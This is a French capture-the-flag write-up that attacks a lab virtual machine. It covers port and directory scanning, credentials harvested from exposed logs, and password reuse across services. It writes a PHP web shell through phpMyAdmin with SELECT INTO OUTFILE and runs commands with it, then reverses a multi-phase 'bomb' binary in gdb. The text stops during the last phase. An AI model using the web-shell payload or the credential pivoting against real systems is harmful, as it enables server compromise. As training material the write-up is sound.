on cherche a exploiter l’iso.
un début d’approche consiste à utiliser nmap (network mapping). 
Ce scanner de port libre va nous permettre de détecter les ports ouverts, d’identifier les services hébergés et d’obtenir des informations sur l’os de la machine. 
Ces renseignements seront précieux pour trouver des failles et des entrées possible.

Le problème est qu’aucune ip n’est visible. Sans ip l’usage de map est impossible.

on fait donc un ifconfig pour trouver l’ip réseau.
il restera ensuite a trouver l’ip hôte.

après avoir fait un ifconfig on obtient ce renseignement :

vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
	ether 0a:00:27:00:00:00
	inet 192.168.56.100 netmask 0xffffff00 broadcast 192.168.56.255


comme vboxnet0 est le réseau sur lequel est la machine a exploiter on peut désormais faire un scan du réseau entier avec nmap pour découvrir l’ip hôte et d’autres informations.


nmap 192.168.56.0-255
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-21 00:43 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00056s latency).
All 1000 scanned ports on 192.168.56.1 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 192.168.56.102
Host is up (0.0013s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (2 hosts up) scanned in 64.06 seconds


au terme de l’execution de la commande on apprend que l’ip de la machine est 192.168.56.102 et que les ports ouverts et les services hébergés sont :
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps


dans la mesure ou ftp et ssh nécessite un mot de passe et un login on va regarder en premier lieu 80/tcp  open  http et 443/tcp open https qui atteste de la présente d’un website sur la machine.



De la même façon que le scanner de port libre nmap nous a aidé au préalable a cartographier l’état de la machine
il faut appliquer la même méthode de cartographie au préalable pour un site web. 
sauf qu’on ne va plus utiliser un scanner de port libre mais un scanner de contenu Web. 

sur notre version kali linux nous allons utiliser le scanner de contenu web dirb afin de connaitre l’ensemble des noms de chemins du site web

ainsi après avoir exécuté sur notre version kali la commande :
dirb https://192.168.56.102  /usr/share/wordlists/dirb/common.txt 

nous obtenons ces renseignements relativement à l’ensemble des noms de chemins du site web :

—> DIRECTORY https://192.168.56.102 /forum/

—> DIRECTORY https://192.168.56.102 /phpmyadmin/

—> DIRECTORY  https://192.168.56.102 /webmail/

comme webmail et phpmyadmin nécessitent des credentials pour se connecter nous allons d’abord regarder la direction forum voir si nous trouvons des informations

sur le forum on trouve un message extrêmement interessant de lmezard a propos d’un problème de login  

après avoir cliqué sur le sujet du forum on voit un ensemble de logs ssh;
 on fait command + f dans le navigateur et on met en entrée le mot password.
on découvre cette ligne très interessante :

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

les logs sont sensé dire quand tel user a échoué à se connecter, le mot de passe n’est pas affiché mais le nom d’user oui 
sauf que justement  !q\]Ej?*5K5cy*AJ ressemble a un mot de passe et non à un login, lmezard a du mettre son mot de passe a la place de son login ce qui a pour consequence d’afficher le contenu de son mot de passe a la place de son login sur les logs !!


en testant le login lmezard et le mot de passe !q\]Ej?*5K5cy*AJ sur ssh ça ne marche pas :
 ssh lmezard@192.168.56.102 et le mot de passe '!q\]Ej?*5K5cy*AJ'  on a 
permission denied, please try again

en revanche le login lmezard et le mot de passe !q\]Ej?*5K5cy*AJ fonctionne pour se connecter à la session utilisateur du forum de lmezard

en arrivant sur la page des informations utilisateurs du profil de lmezard on remarque un champ dans lequel est renseigné son adresse email laurie@borntosec.net

avec un peu de chance lmezard a utilisé le meme mot de passe pour son espace email que pour son espace forum 

en allant sur https://192.168.56.102/webmail/src/login.php on va taper les credentials laurie@borntosec.net et !q\]Ej?*5K5cy*AJ
ça fonctionne ! on a accès a son espace email ! lmezard a utilisé plusieurs fois le même mot de passe pour des connexions à des espaces différents

on découvre un message à propos de DB Access :

Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.

ce message nous donne les credentials pour phpmyadmin !
on va donc se rendre sur la page https://192.168.56.102/phpmyadmin/ pour rentrer les credentials trouvé dans les emails !
en rentrant root en login et Fg-'kKXBj87E:aJ$ en password ça fonctionne !

pour essayer de devenir root sur la machine à partir de notre statut de root sur la base de donnée 
on va injecter des commandes sql dans la console SQL de phpmyadmin.
l’ideal serait de créer une page qui reçoit une commande depuis l’url qui sera ensuite exécuté par php sur le serveur

 une commande tel que :
SELECT "<?php system($_GET['cmd']) ?>" 

mais on ne connait pas suffisamment l’arborescence pour savoir à quel endroit on a les droits d’écriture 
aussi pour avoir de meilleur renseignement sur le service apache afin de trouver des failles on va executer la commande  nmap -sV 192.168.56.102 pour connaitre la version du service apache. On découvre ceci : 
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))

après des recherches on découvre que La méthode par défaut de httpd pour déterminer quel fichier servir pour une requête donnée, consiste à extraire le chemin du fichier de la requête (la partie de l'URL qui suit le nom d'hôte et le port), puis de l'ajouter à la fin de la valeur de la directive DocumentRoot.
Or après des recherches on sait par défaut que le serveur web Apache2 stocke ses documents dans /var/www/html sur ubuntu.

d’où il nous reste à faire à nouveau un dirb pour tester tout les chemins dans lequel nous avons un droit d’écriture
on a trouvé les droits d’écriture pour ce chemin !!!
192.168.56.102/forum/templates_c/


il nous reste plus qu’à écrire dans la console SQL et d’executer : 
SELECT "<?php system($_GET['cmd']) ?>"  into outfile "/var/www/forum/templates_c/reverse.php"

comme on sait que le home directory sur ubuntu est /home et qu’on est sur ubuntu on va maintenant s’amuser à aller sur le browser et mettre cette url dans la barre :
https://192.168.56.102/forum/templates_c/reverse.php?cmd=ls%20-la%20/home

(pour %20 c’est parce que The JavaScript function encodes space as %20. ASCII Encoding Reference.)

et nous tombons sur un dossier LOOKATME
après avoir rentré l’url on découvre un fichier password ! et on ouvre le fichier
et on découvre cela : lmezard:G!@M6f4Eatau{sF"

après avoir essayé sans succès ssh lmezard@192.168.56.102 -p 22 et le mot de passe G!@M6f4Eatau{sF"
on va essayer les credentials pour le ftp avec la commande 
ftp lmezard@192.168.56.102
et le mot de passe G!@M6f4Eatau{sF" on parvient à se loguer !!!

on trouve deux elements a récupérer : un README contenant ceci :
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
et un element nommé fun.

l’element nomme fun n’est pas lisible, c’est peut être un fichier d’archive tar 
en faisant tar xvf fun on a effectivement un ensemble de fichiers dans un repertoire nommé ft_fun ! 

les fichiers se terminent pas l’extension .pcap ce sont surement des captures réseaux !! 
on essaye d’ouvrir les fichier avec wireshark mais sans succès ce ne sont pas des vrai fichier .pcap

on faisant un cat sur le premier fichier de tel que :
cat 00M73.pcap
void useless() {

//file12%

on voit quelque chose de très interessant : un commentaire;
on sait que les commentaire dans un code source en général donnent des renseignements compromettant 

peut être que le fichier en question se nomme file12 d’où peut être aussi que la suite de la fonction est dans le file13

donc on fait un grep "//file13" *

et on obtient cela : 
2F8NC.pcap://file135
3AAX2.pcap://file137
4XQJP.pcap://file131
9IQDI.pcap://file13
B5Z5B.pcap://file138
F117I.pcap://file133
GU5R3.pcap://file134
GU6EL.pcap://file139
I7RU7.pcap://file132
RU7XX.pcap://file130
Z0HH4.pcap://file136 

on fait un cat 9IQDI.pcap et on tombe sur cela 

~/ft_fun cat 9IQDI.pcap
	printf("Hahahaha Got you!!!\n");

//file13%

après avoir répété le schéma quatre fois on retombe toujours sur un printf donc on va s’amuser à faire un grep printf :
grep "printf" *

on tombe sur quelques chose d’extrêmement interessant !!!! 


BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("M");
BJPCP.pcap:	printf("Y");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("P");
BJPCP.pcap:	printf("A");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf("W");
BJPCP.pcap:	printf("O");
BJPCP.pcap:	printf("R");
BJPCP.pcap:	printf("D");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("I");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf(":");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("%c",getme1());
BJPCP.pcap:	printf("%c",getme2());
BJPCP.pcap:	printf("%c",getme3());
BJPCP.pcap:	printf("%c",getme4());
BJPCP.pcap:	printf("%c",getme5());
BJPCP.pcap:	printf("%c",getme6());
BJPCP.pcap:	printf("%c",getme7());
BJPCP.pcap:	printf("%c",getme8());
BJPCP.pcap:	printf("%c",getme9());
BJPCP.pcap:	printf("%c",getme10());
BJPCP.pcap:	printf("%c",getme11());
BJPCP.pcap:	printf("%c",getme12());
BJPCP.pcap:	printf("\n");
BJPCP.pcap:	printf("Now SHA-256 it and submit");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");
BJPCP.pcap:	printf("Hahahaha Got you!!!\n");


entre des Hahahaha Got you!!! on tombe sur 

BJPCP.pcap:	printf("M");
BJPCP.pcap:	printf("Y");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("P");
BJPCP.pcap:	printf("A");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf("W");
BJPCP.pcap:	printf("O");
BJPCP.pcap:	printf("R");
BJPCP.pcap:	printf("D");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("I");
BJPCP.pcap:	printf("S");
BJPCP.pcap:	printf(":");
BJPCP.pcap:	printf(" ");
BJPCP.pcap:	printf("%c",getme1());
BJPCP.pcap:	printf("%c",getme2());
BJPCP.pcap:	printf("%c",getme3());
BJPCP.pcap:	printf("%c",getme4());
BJPCP.pcap:	printf("%c",getme5());
BJPCP.pcap:	printf("%c",getme6());
BJPCP.pcap:	printf("%c",getme7());
BJPCP.pcap:	printf("%c",getme8());
BJPCP.pcap:	printf("%c",getme9());
BJPCP.pcap:	printf("%c",getme10());
BJPCP.pcap:	printf("%c",getme11());
BJPCP.pcap:	printf("%c",getme12());
BJPCP.pcap:	printf("\n");
BJPCP.pcap:	printf("Now SHA-256 it and submit");


on connait désormais les fichiers intéressant et on va s’amuser à reconstituer la fonction qui nous renseigne le mot de passe :


ainsi la fonction complète est :

#include <stdio.h>
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}

en compilant avec gcc et en executant le a.out on tombe sur 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%


on va maintenant SHA-256 Iheartpwnage !! 
on tombe sur cela :

330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

maintenant on va ssh tout ça !!

on fait ssh laurie@192.168.56.102 -p 22
et on met 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 et on y est !

une fois connecté on trouve un README et un executable nommé bomb 
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb


si on tape la commande ./bomb on obtient ceci :
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!

on comprend que le programme attends si phase successives d’input, et que chaque chaine de caractère rentrée en input va être testé avant de passer a la phase suivante  

si on fait un file bomb on découvre que l’executable est « not stripped » ; on va donc pouvoir se servir de gdb pour essayer de récupérer les bonnes info à transmettre pour résoudre la bomb

en faisant gdb ./bomb 
gdb run 
et gdb disas main
 
on obtient ceci :

<read_line>
   0x08048a57 <+167>:	add    $0xfffffff4,%esp
   0x08048a5a <+170>:	push   %eax
   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
   0x08048a60 <+176>:	call   0x804952c <phase_defused>
   0x08048a65 <+181>:	add    $0xfffffff4,%esp
   0x08048a68 <+184>:	push   $0x80496e0
   0x08048a6d <+189>:	call   0x8048810 <printf@plt>
   0x08048a72 <+194>:	add    $0x20,%esp
   0x08048a75 <+197>:	call   0x80491fc <read_line>
   0x08048a7a <+202>:	add    $0xfffffff4,%esp
   0x08048a7d <+205>:	push   %eax
   0x08048a7e <+206>:	call   0x8048b48 <phase_2>
   0x08048a83 <+211>:	call   0x804952c <phase_defused>
   0x08048a88 <+216>:	add    $0xfffffff4,%esp
   0x08048a8b <+219>:	push   $0x8049720
   0x08048a90 <+224>:	call   0x8048810 <printf@plt>
   0x08048a95 <+229>:	add    $0x20,%esp
   0x08048a98 <+232>:	call   0x80491fc <read_line>
   0x08048a9d <+237>:	add    $0xfffffff4,%esp
   0x08048aa0 <+240>:	push   %eax
   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:	call   0x804952c <phase_defused>
   0x08048aab <+251>:	add    $0xfffffff4,%esp
   0x08048aae <+254>:	push   $0x804973f
   0x08048ab3 <+259>:	call   0x8048810 <printf@plt>
   0x08048ab8 <+264>:	add    $0x20,%esp
   0x08048abb <+267>:	call   0x80491fc <read_line>
   0x08048ac0 <+272>:	add    $0xfffffff4,%esp
   0x08048ac3 <+275>:	push   %eax
   0x08048ac4 <+276>:	call   0x8048ce0 <phase_4>
   0x08048ac9 <+281>:	call   0x804952c <phase_defused>
   0x08048ace <+286>:	add    $0xfffffff4,%esp
   0x08048ad1 <+289>:	push   $0x8049760
   0x08048ad6 <+294>:	call   0x8048810 <printf@plt>
   0x08048adb <+299>:	add    $0x20,%esp
   0x08048ade <+302>:	call   0x80491fc <read_line>
   0x08048ae3 <+307>:	add    $0xfffffff4,%esp
   0x08048ae6 <+310>:	push   %eax
   0x08048ae7 <+311>:	call   0x8048d2c <phase_5>
   0x08048aec <+316>:	call   0x804952c <phase_defused>
   0x08048af1 <+321>:	add    $0xfffffff4,%esp
   0x08048af4 <+324>:	push   $0x80497a0
   0x08048af9 <+329>:	call   0x8048810 <printf@plt>
   0x08048afe <+334>:	add    $0x20,%esp
   0x08048b01 <+337>:	call   0x80491fc <read_line>
   0x08048b06 <+342>:	add    $0xfffffff4,%esp
   0x08048b09 <+345>:	push   %eax
   0x08048b0a <+346>:	call   0x8048d98 <phase_6>


nos intuitions sont bien confirmé on a bien 6 fois <read_line> suivi de <phase_1>, 2, 3, 4, 5, 6 puis <phase_defused> à 6 reprise 

on va faire maintenant un gdb disas phase_1 désormais 
et on obtient quelque chose de très interessant ! 

   0x08048b2c <+12>:	push   $0x80497c0
   0x08048b31 <+17>:	push   %eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>


or on sait que eax  est un registre d’accumulation étendu : il est utilisé pour stocker le résultat d’opérations arithmétiques ou les valeurs de retour des routines appelées

il nous reste plus qu’à taper la commande x/s 0x80497c0 dans gdb 
x / s précisément parce qu’on veut remplacer l’ affichage hexa par un affichage sur forme de chaine (string) et on obtient ceci :

0x80497c0:	 "Public speaking is very easy."

Public speaking is very easy.


pour la deuxième phase on voit que la phase 2 appelle une fonction <read_six_numbers>
notre input sera donc sans doute 6 int séparés par des espaces
on met un breakpoint au niveau de l’ adresse de la phase 2 et on run la bombe en complétant la phase_1 grâce à l’input "Public speaking is very easy."
on peut maintenant faire un disas maintenant que nous sommes arrêté à notre point d’arrêt  

0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
un nombre est comparé ici à 1, 

si la condition n’est pas rempli la bombe explose, 
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
Cela signifie que le premier entier de notre phrase secrète est sans aucun doute 1.

on sait d’après l’indice du README que le nombre suivant est 2

 0x08048b89 <+65>:	cmp    $0x5,%ebx on voit que tant que %ebx est inférieur à 5 %ebx continu de s’incrémenter dans une boucle jusqu’à atteindre 5
sûrement la boucle while de notre fonction <read_six_numbers>
sachant que le nombre 1, premier de la suite est déjà géré par la structure de contrôle précédente 


 0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
 0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)

à l’intérieur de la boucle on aperçoit ces deux lignes : une multiplication et une comparaison,
il nous suffit de faire un jump a l’adresse de comparaison puis taper i r (pour information registre)
pour découvrir la valeur de %eax à ce moment 
après une succession de until pour consulter le registre à chaque itération on découvre la suite 

1 2 6 24 120 720



pour la troisième phase 


0x08048bb7 <+31>: call   0x8048860 <sscanf@plt> 
La première chose intéressante que nous voyons ici est l'appel scanf qui se produit à l'adresse mémoire 8048bb7
scan car il y a une lecture de l’entrée standard et f car il y a un paramétrage de format, essayons de trouver ce format 

  0x08048bbf <+39>:	cmp    $0x2,%eax
  0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
on observe une comparaison et un appel à la fonction <explode_bomb> si la structure de contrôle par la comparaison n’est pas respecté

Utilisons gdb pour comprendre ce qu'ils sont.
nous allons définir un point d'arrêt à notre phase, phase_3, puis lancer la bombe en remplissant les réponses usuelles pour les phases précédentes 
après un run et un disas
 
la valeur $0x80497de qui est push désormais nous interesse alors plus particulièrement 

(gdb) x/s 0x80497de
0x80497de:	 "%d %c %d"

A partir de là , nous voyons que le format demandé suit le format %d %c %d.
soit un int un char et un int

on sait grâce aux indices du README que le char en question est un ‘b’, il faut maintenant trouver les deux ints
on peut recommencer le run avec le bon format désormais pour remplir la première condition de la phases 3 et aller plus loin 
on ayant entré 1 b 2

0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>

ces deux lignes sont extrêmement interessant ja signifie jump above autrement dit on jump pour sauter la fonction <explose_bomb> si notre premier int est inférieur à 7 



de même avec ces lignes : 
   0x08048c00 <+104>:	mov    $0x62,%bl
   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>


nous voyons que la valeur $0xd6est comparée à la valeur stockée à -0x4(%ebp). 
d6en hexadécimal est égal à 214 en décimal.
Étant donné que l'instruction de saut pour manquer le prochain <explode_bomb>appel nécessite l'égalité, cela signifie que notre deuxième entier doit être 214.

nous allons essayer les entiers 1, 2, 3, 4, 5, 6, 7 comme premier int
après avoir testé 1 b 214 on arrive à la phase suivante ! 


pour la phase 4 on constate un usage de scanf 
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>


on observe deux lignes avant un push de valeur fixe qui doit être l’input format 
   0x08048cf0 <+16>:	push   $0x8049808

(gdb) until *0x08048cf5
0x08048cf5 in phase_4 ()

(gdb) x/s 0x8049808
0x8049808:	 "%d"
(gdb)

on voit bien que la réponse à cette phase doit être un seul entier !
on voit les lignes suivante l’ appel d’une <func4>
Notre valeur d'entrée, qui est stockée dans %eax, est entrée dans cette autre fonction appelée <func4>. À l'heure actuelle, il  s'agit d'une boîte noire, nous devrons donc la creuser en utilisant si pour comprendre ce qu'elle fait à notre entier

   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    $0x10,%esp
   0x08048d1d <+61>:	cmp    $0x37,%eax
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>

La dernière chose que nous devons considérer est que, après <func4> a été appelée et renvoyé notre entrée potentiellement modifiée à %eax, 
%eax est comparée à la valeur hexadécimale 37, qui en décimal est 55.

 Cela signifie que, quelle que soit notre entrée pour commencer, elle a besoin être transformé en 55 par <func4>.

Donc, maintenant que nous savons ce qui se passe généralement dans <phase_4>, <func4>examinons ce que nous devons saisir pour générer 55.

 disas func4

   0x08048ca0 <+0>:	push   %ebp
   0x08048ca1 <+1>:	mov    %esp,%ebp
   0x08048ca3 <+3>:	sub    $0x10,%esp
   0x08048ca6 <+6>:	push   %esi
   0x08048ca7 <+7>:	push   %ebx
   0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
   0x08048cab <+11>:	cmp    $0x1,%ebx
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:	add    $0xfffffff4,%esp
   0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
   0x08048cb6 <+22>:	push   %eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
   0x08048cbc <+28>:	mov    %eax,%esi
   0x08048cbe <+30>:	add    $0xfffffff4,%esp
   0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
   0x08048cc4 <+36>:	push   %eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
   0x08048cca <+42>:	add    %esi,%eax
   0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
   0x08048cce <+46>:	mov    %esi,%esi
   0x08048cd0 <+48>:	mov    $0x1,%eax
   0x08048cd5 <+53>:	lea    -0x18(%ebp),%esp
   0x08048cd8 <+56>:	pop    %ebx
   0x08048cd9 <+57>:	pop    %esi
   0x08048cda <+58>:	mov    %ebp,%esp
   0x08048cdc <+60>:	pop    %ebp
   0x08048cdd <+61>:	ret

on remarque que cette fonction s'appelle elle-même, ce qui la rend récursive. Toutes les fonctions récursives ont un « cas de base », qui termine la boucle, puis une série d'instructions à suivre afin de continuer la boucle si le cas de base n'est pas respecté.

Commençons par identifier notre cas de base. 
  0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
   0x08048cab <+11>:	cmp    $0x1,%ebx
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>

La fonction compare son entrée à 1. Si l'entrée est inférieure ou égale à 1, elle passe à <func4+48>, où la valeur de retour est définie sur un. Enfin, il renvoie cette valeur.

Maintenant que nous comprenons que le cas de base se produit lorsque input=1, identifions ce qui se passe lorsque le cas de base n'est pas respecté. La première chose à noter est que la fonction s'appelle elle-même deux fois, une fois à <func4+23>et une fois à <func4+37>. La première fois qu'il s'appelle lui-même, il alimente le nouvel appel de fonction son input-1. De même, la deuxième fois qu'il s'appelle, il alimente la nouvelle fonction appeler son input-2. Une fois les deux fonctions appelées récursivement renvoyées, elle additionne leurs valeurs de retour à <func4+42>et renvoie le résultat.
Voici à quoi ressemblerait le code C correspondant :

int test(int n) {  
  if (n<2)
    return n;
  else
    return test(n-1) + test(n-2);
}

nous avons une fonction où F(x) = F(x-1) + F(x-2)
ce modèle correspond à la suite de fibonacci 


Or afin d'éviter que la bombe n’explose, tout ce qui est envoyé doit être égal à l'hexa 37, ce qui correspond à 55 en décimal.
Comme nous pouvons le voir dans le tableau ci-dessus, le nombre de Fibonacci pour 55 est 10. Donc, étant donné notre logique, 10-1 = 9, donc 9 devrait être la solution pour la quatrième phase.

on mettant 9 à la phase 4 on passe à la phase 5 !



(gdb) disas
Dump of assembler code for function phase_5:
   0x08048d2c <+0>:	push   %ebp
   0x08048d2d <+1>:	mov    %esp,%ebp
   0x08048d2f <+3>:	sub    $0x10,%esp
   0x08048d32 <+6>:	push   %esi
   0x08048d33 <+7>:	push   %ebx
=> 0x08048d34 <+8>:	mov    0x8(%ebp),%ebx
   0x08048d37 <+11>:	add    $0xfffffff4,%esp
   0x08048d3a <+14>:	push   %ebx
   0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    $0x10,%esp
   0x08048d43 <+23>:	cmp    $0x6,%eax
   0x08048d46 <+26>:	je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:	call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:	xor    %edx,%edx
   0x08048d4f <+35>:	lea    -0x8(%ebp),%ecx
   0x08048d52 <+38>:	mov    $0x804b220,%esi
   0x08048d57 <+43>:	mov    (%edx,%ebx,1),%al
   0x08048d5a <+46>:	and    $0xf,%al
   0x08048d5c <+48>:	movsbl %al,%eax
   0x08048d5f <+51>:	mov    (%eax,%esi,1),%al
   0x08048d62 <+54>:	mov    %al,(%edx,%ecx,1)
   0x08048d65 <+57>:	inc    %edx
   0x08048d66 <+58>:	cmp    $0x5,%edx
   0x08048d69 <+61>:	jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:	movb   $0x0,-0x2(%ebp)
   0x08048d6f <+67>:	add    $0xfffffff8,%esp
   0x08048d72 <+70>:	push   $0x804980b
   0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:	push   %eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:	add    $0x10,%esp
   0x08048d83 <+87>:	test   %eax,%eax
   0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:	lea    -0x18(%ebp),%esp
   0x08048d8f <+99>:	pop    %ebx
   0x08048d90 <+100>:	pop    %esi
   0x08048d91 <+101>:	mov    %ebp,%esp
   0x08048d93 <+103>:	pop    %ebp
   0x08048d94 <+104>:	ret
End of assembler dump.



  0x08048d3b <+15>:	call   0x8049018 <string_length>
   0x08048d40 <+20>:	add    $0x10,%esp
   0x08048d43 <+23>:	cmp    $0x6,%eax

Tout d'abord, nous pouvons voir à partir de l'appel à <string_length> a la ligne phase_5 + 15
et de la déclaration suivante que notre chaîne doit comporter six caractères.

   0x08048d65 <+57>:	inc    %edx
   0x08048d66 <+58>:	cmp    $0x5,%edx

nous voyons qu'un registre est incrémenté suivi d'une instruction jump-less-than juste après, il y a 6 itérations comme on voit avec le $0x5 
Étant donné que notre chaîne comporte 6 caractères, il est logique de supposer que la fonction itère sur chaque caractère de la boucle et leur fait probablement quelque chose.


   0x08048d72 <+70>:	push   $0x804980b
   0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:	push   %eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>


nous pouvons voir en bas de la fonction que <strings_not_equal> est appelée après que le contenu de %eax et l'adresse fixe 0x804980b ont été poussés sur la pile. 
Cela ressemble à la phase 1. Le code compare la chaîne (vraisemblablement notre entrée) stockée dans %eax à une chaîne fixe stockée à 0x804980b.

d’où :
notre entrée doit être une chaîne de 6 caractères
la fonction accepte cette chaîne de 6 caractères et boucle sur chaque caractère qu'elle contient
le résultat de la boucle est comparé à une chaîne fixe, et s'ils sont égaux, la bombe n'explose pas

Dans l'étape suivante, on va passer une chaîne de test et examiner ce que la boucle lui fait. 
Ensuite, on va regarder  la valeur fixe que nous sommes censés faire correspondre et partir de là

(gdb) x/6c 0x804980b
0x804980b:	103 'g'	105 'i'	97 'a'	110 'n'	116 't'	115 's'
voici la valeur a faire correspondre 

(gdb) until *0x08048d7a
0x08048d7a in phase_5 ()

(gdb) x/6c $eax
0xbffff6e0:	115 's'	114 'r'	118 'v'	101 'e'	97 'a'	119 'w'

en ayant rentré abcdef on obtient srveaw !!!

on va rentrer tout les caractères de a à z pour voir les lettres équivalente à notre chaine giants
a b c d e f               g h i j k l               m n o p q r       s t u v w x           a b c d y z
s r v e a w               h o b p n u           t f g i s r           v e a w h o                      b p

on a maintenant la solution opekmq !


passons maintenant à la dernière phase de notre projet ! 

Tout d'abord, on voit la fonction <read_six_numbers> de la phase 2 de retour. Ainsi, notre entrée devrait être six entiers.

   0x08048dc7 <+47>:	cmp    $0x5,%eax
cette ligne s’assure que chaque numéro de notre mot de passe est inférieur à six.


 0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
   0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
   0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
   0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
   0x08048df6 <+94>:	inc    %ebx
   0x08048df7 <+95>:	cmp    $0x5,%ebx
   0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>

La dernière contrainte sur notre entrée se produit dans les boucles imbriquées entre <phase_6+57>et <phase_6+104>. Nous avons une boucle avec des itérateurs %ebx et %edi. Essentiellement, ce qui se passe, c'est que nous comparons chaque nombre avec tous les autres nombres, et nous ne sautons <explode_bomb> en ligne que <phase_6+89> si les comparaisons ne sont pas égales. En d'autres termes, nos six nombres entiers doivent être distincts.

d’où il nous faut 	
six nombres entiers séparés par des espaces
